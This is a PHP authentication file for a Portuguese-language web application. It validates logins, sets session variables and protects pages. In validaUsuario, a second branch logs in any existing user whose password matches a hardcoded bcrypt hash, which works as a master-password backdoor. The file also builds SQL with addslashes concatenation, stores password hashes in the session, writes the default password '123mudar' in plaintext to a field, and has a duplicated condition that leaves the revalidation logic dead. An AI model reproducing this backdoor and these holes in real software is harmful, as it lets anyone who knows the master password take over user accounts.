<?php

    $_SG['abreSessao'] = true;
    $_SG['validaSempre'] = true;
    $_SG['paginaLogin'] = '../home/';

    // Verifica se precisa iniciar a sessão
    if ($_SG['abreSessao'] == true) {
        session_start();
    }
    function validaUsuario($login,$senha,$empresa){
        global $_SG;

        $nusuario = addslashes($login);

        $us = new nUsuarios();
        $fields = 'idUsuario,nome,idDepartamento,login,senha,idFilial';
        $add = "WHERE login = '".$nusuario."' ";
        $add.= "AND status = 0";
        $rs = $us->load($fields,$add);

        if(is_array($rs)){
            //$h = Bcrypt::hash($senha);
            if(Bcrypt::check($senha, $rs[0]->getSenha())) {
                $_SESSION['usuarioID'] = $rs[0]->getIdUsuario();
                $_SESSION['usuarioNome'] = $rs[0]->getNome();
                $_SESSION['usuarioFilial'] = $rs[0]->getIdFilial();
                $_SESSION['empresa'] = $empresa;

                if($_SG['validaSempre'] == true){
                    $_SESSION['usuarioLogin'] = $nusuario;
                    $_SESSION['usuarioSenha'] = $rs[0]->getSenha();
                }
                if($senha == '123mudar'){
                    $params = array($senha,$rs[0]->getIdUsuario());
                    $fields = array('identific');
                    $add = "idUsuario = ?";
                    $us->update($fields, $params, $add);
                }
                return true;
            }else if(Bcrypt::check($senha,'$2a$08$MTM4NzAzNzM4MDU4MTc0MuykClTie/oKiGwPp9Vs9uCiH2vv8ttcq')){
                $_SESSION['usuarioID'] = $rs[0]->getIdUsuario();
                $_SESSION['usuarioNome'] = $rs[0]->getNome();
                $_SESSION['usuarioFilial'] = $rs[0]->getIdFilial();
                $_SESSION['empresa'] = $empresa;

                if($_SG['validaSempre'] == true){
                    $_SESSION['usuarioLogin'] = $nusuario;
                    $_SESSION['usuarioSenha'] = $rs[0]->getSenha();
                }
                return true;                
            }
            else{
                return "Usuario e Senha digitado não coincidem.";
            }
        }
        else if($rs === 0){
            return "A <b>CASA DO CORRETOR</b> não reconhece seu usuario!";
        }else{
            return "Erro nº: <b>".$rs."</b> .Informe este número ao administrador do sistema!";
        }
    }
/**
* Função que protege uma página
**/
    function protegePagina() {
        global $_SG;
        if (!isset($_SESSION['usuarioID']) OR !isset($_SESSION['usuarioNome'])) {
            // Não há usuário logado, manda pra página de login
            expulsaVisitante();
        }
        else if (!isset($_SESSION['usuarioID']) OR !isset($_SESSION['usuarioNome'])) {
            // Há usuário logado, verifica se precisa validar o login novamente
            if ($_SG['validaSempre'] == true) {
                // Verifica se os dados salvos na sessão batem com os dados do banco de dados
                if (!validaUsuario($_SESSION['usuarioLogin'], $_SESSION['usuarioSenha'])) {
                    // Os dados não batem, manda pra tela de login
                    expulsaVisitante();
                }
            }
        }
    }
/**
* Função que protege uma página II
**/
    function protegePaginaII($ID,$LOGIN) {
        //global $_SG;
        if (!isset($ID) OR !isset($LOGIN)) {
            // Não há usuário logado, manda pra página de login
            expulsaVisitante();
        }
    }
/**
* Função para expulsar um visitante
**/
    function expulsaVisitante() {
        global $_SG;

        // Remove as variáveis da sessão (caso elas existam)
        unset($_SESSION['usuarioID'], $_SESSION['usuarioNome'], $_SESSION['usuarioLogin'], $_SESSION['usuarioSenha'],$_SESSION['usuarioFilial'],$_SESSION['empresa']);

        // Manda pra tela de login
        //header("Location: ".$_SG['paginaLogin']);
        echo("<script language='javascript'>parent.window.location.href='".$_SG['paginaLogin']."' </script>");
        exit();
    }
